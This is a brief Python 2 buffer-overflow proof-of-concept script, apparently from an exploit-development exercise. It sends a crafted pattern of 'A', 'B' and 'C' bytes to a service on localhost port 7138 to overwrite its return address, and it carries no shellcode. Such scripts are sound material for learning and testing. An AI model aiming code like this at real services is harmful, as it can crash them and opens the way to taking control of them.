#!/usr/bin/python
import socket

try:
    print "\n Sending Malicious Code to Buffer..."
    buffer = 'A' * 340 + 'B' * 4 + 'C' * (1000-340-4)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 7138))
    s.send(buffer)
    s.close()

    print "\nBuffer Overflowed"

except:
    print "Could not connect to application"
